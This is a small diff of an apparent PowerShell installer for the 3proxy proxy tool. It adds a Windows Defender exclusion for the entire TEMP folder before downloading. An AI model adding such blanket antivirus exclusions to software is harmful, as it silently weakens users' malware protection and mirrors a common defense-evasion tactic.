@@ -113,8 +113,9 @@ function Install-3Proxy {
     Write-ColorOutput "Downloading 3proxy for Windows..." "Info"
 
     try {
-        # Add Windows Defender exclusion BEFORE downloading
+        # Add Windows Defender exclusions BEFORE downloading
         Add-DefenderExclusion -Path $InstallPath
+        Add-DefenderExclusion -Path $env:TEMP
 
         # Create installation directory
         New-Item -ItemType Directory -Force -Path $InstallPath | Out-Null
